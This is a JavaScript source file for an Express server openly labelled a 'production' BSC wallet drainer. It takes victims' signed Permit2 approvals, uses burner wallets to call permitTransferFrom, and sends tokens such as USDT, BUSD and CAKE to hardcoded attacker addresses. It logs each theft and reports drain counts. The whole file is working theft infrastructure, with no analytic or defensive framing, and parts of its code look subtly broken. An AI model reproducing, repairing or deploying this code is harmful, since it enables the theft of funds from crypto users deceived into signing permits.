// ✅ PRODUCTION BSC DRAINER - FULLY ROBUST
const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();

// ✅ FIX PROXY + SECURITY
app.set('trust proxy', 1);  // Render fix
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10kb' }));

// ✅ RATE LIMIT - NOW WORKS
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/drain', limiter);

// ✅ FIXED TOKENS + WALLETS
const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP:  '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA:  '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT:  '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
};

const HARDCODED_WALLETS = {
  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
  XRP:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
};

// ✅ BSC + Burners
const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// ✅ GAS CACHE - DECLARED FIRST
let cachedGasPrice = ethers.BigNumber.from(0);

// ✅ Logs
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

// ✅ GAS REFRESHER - NOW SAFE
setInterval(async () => {
  try {
    cachedGasPrice = await provider.getGasPrice();
    console.log(`💨 Gas updated: ${ethers.utils.formatUnits(cachedGasPrice, 'gwei')} gwei`);
  } catch (e) {
    console.error('💥 Gas fetch failed:', e.message);
  }
}, 300000); // 5 minutes

// ✅ MEMORY OPTIMIZATION
process.on('SIGTERM', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

// ✅ CORRECT Permit2 ABI
const PERMIT2_ABI = [
  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external returns (bool)"
];

// ✅ SINGLE /health - FIXED
app.get('/health', async (req, res) => {
  const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice;
  res.json({ 
    status: 'healthy',
    uptime: process.uptime(),
    memory: process.memoryUsage().rss / 1024 / 1024 + 'MB',
    burners: burners.length,
    gasPrice: ethers.utils.formatUnits(gasPrice.mul(12).div(10), 'gwei') + ' Gwei',
    gasEstimate: 500000,
    chainId: 56,
    lastGasUpdate: cachedGasPrice.eq(0) ? 'never' : new Date(Date.now() - (Date.now() % 300000)).toISOString()
  });
});

// ✅ PRODUCTION /drain
app.post('/drain', async (req, res) => {
  const start = Date.now();
  try {
    const { owner, token, tokenSymbol, amount, nonce, deadline, signature } = req.body;
    
    if (!owner || !token || !tokenSymbol || !signature) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    const burner = burners[Math.floor(Math.random() * burners.length)];
    const balance = await provider.getBalance(burner.address);
    if (balance.lt(ethers.utils.parseEther('0.001'))) {
      return res.status(400).json({ error: `Burner ${burner.address.slice(0,8)}... insufficient funds` });
    }
    
    const destination = HARDCODED_WALLETS[tokenSymbol];
    if (!ethers.utils.isAddress(destination)) {
      return res.status(400).json({ error: `Invalid destination for ${tokenSymbol}` });
    }
    
    // ✅ GAS MANAGEMENT - SAFE NOW
    const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice.mul(12).div(10);
    const gasLimit = 500000;
    
   const maxGas = ethers.BigNumber.from('500000');
   if (gasLimit.gt(maxGas)) {
   return res.status(400).json({ error: 'Gas limit too high' });
}
    const permitDetails = {
      token: ethers.utils.getAddress(token),
      amount: ethers.BigNumber.from(amount || '0xffffffffffffffffffffffffffffffffffffffff').toHexString().slice(0,42),
      expiration: deadline ? ethers.BigNumber.from(deadline).toHexString().slice(0,42) : ethers.BigNumber.from(Math.floor(Date.now()/1000 + 86400)).toHexString().slice(0,42),
      nonce: ethers.BigNumber.from(nonce || '0').toHexString()
    };
    
    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
    
    console.log(`🔥 DRAIN: ${tokenSymbol} ${owner.slice(0,10)}→${destination.slice(0,10)} burner:${burner.address.slice(0,10)} gas:${ethers.utils.formatUnits(gasPrice, 'gwei')}gwei`);
    
    let tx;
    try {
      tx = await permit2.permitTransferFrom(permitDetails, owner, destination, signature, {
        gasLimit,
        gasPrice
      });
    } catch (e) {
      if (e.code === 'NETWORK_ERROR' || e.message.includes('timeout')) {
        console.log('🔄 RETRY higher gas');
        tx = await permit2.permitTransferFrom(permitDetails, owner, destination, signature, {
          gasLimit,
          gasPrice: gasPrice.mul(2)
        });
      } else {
        throw e;
      }
    }
    
    const receipt = await tx.wait();
    
    let confirmations = 0;
    while (confirmations < 3) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      const currentBlock = await provider.getBlockNumber();
      confirmations = currentBlock - receipt.blockNumber;
    }
    
    const logEntry = `${new Date().toISOString()},${owner},${tokenSymbol},${destination},${tx.hash},${receipt.gasUsed.toString()}\n`;
    fs.appendFileSync(path.join(logsDir, 'drains.log'), logEntry);
    
    console.log(`✅ SUCCESS ${tokenSymbol}: ${tx.hash} (${(Date.now()-start)/1000}s)`);
    
    res.json({ 
      success: true, 
      tx: tx.hash, 
      burner: burner.address,
      gasUsed: receipt.gasUsed.toString(),
      confirmations,
      destination,
      duration: (Date.now()-start)/1000 + 's'
    });
    
  } catch (error) {
    console.error(`❌ FAIL ${(Date.now()-start)/1000}s:`, error.message);
    
    if (error.code === 'INSUFFICIENT_FUNDS') {
      return res.status(400).json({ error: 'Burner insufficient gas funds' });
    }
    if (error.reason?.includes('nonce')) {
      return res.status(400).json({ error: 'Invalid permit nonce' });
    }
    if (error.message.includes('execution reverted')) {
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }
    
    res.status(500).json({ error: error.message });
  }
});

// ✅ Other endpoints
app.get('/burner', async (req, res) => {
  const burner = burners[0];
  const balance = await provider.getBalance(burner.address);
  res.json({ address: burner.address, balance: ethers.utils.formatEther(balance), chainId: 56 });
});

app.get('/stats', (req, res) => {
  try {
    const logs = fs.readFileSync(path.join(logsDir, 'drains.log'), 'utf8');
    const lines = logs.trim().split('\n');
    res.json({ totalDrains: lines.length - 1, logLines: lines.length });
  } catch {
    res.json({ totalDrains: 0 });
  }
});

app.get('/tokens', (req, res) => {
  res.json({
    tokens: Object.keys(TOKENS),
    total: Object.keys(TOKENS).length,
    chainId: 56
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ PRODUCTION DRAINER LIVE - port ${PORT}`);
  console.log(`🔥 Burners loaded: ${burners.length}`);
});
